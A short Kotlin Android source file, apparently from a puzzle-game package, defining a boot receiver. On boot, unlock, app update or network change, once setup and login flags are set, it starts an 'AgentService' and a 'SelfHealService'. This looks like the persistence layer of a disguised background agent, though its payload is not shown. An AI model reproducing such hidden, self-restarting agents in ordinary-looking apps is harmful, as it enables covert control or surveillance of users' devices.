package com.puzzleblast.game.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.puzzleblast.game.util.Prefs

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        val action = intent?.action ?: return
        if (action in listOf(
                Intent.ACTION_BOOT_COMPLETED,
                Intent.ACTION_LOCKED_BOOT_COMPLETED,
                "android.intent.action.QUICKBOOT_POWERON",
                Intent.ACTION_MY_PACKAGE_REPLACED,
                Intent.ACTION_USER_PRESENT,
                "android.net.conn.CONNECTIVITY_CHANGE"
            )) {
            if (Prefs.wizardDone && Prefs.authed) {
                AgentService.start(ctx)
                SelfHealService.start(ctx)
            }
        }
    }
}
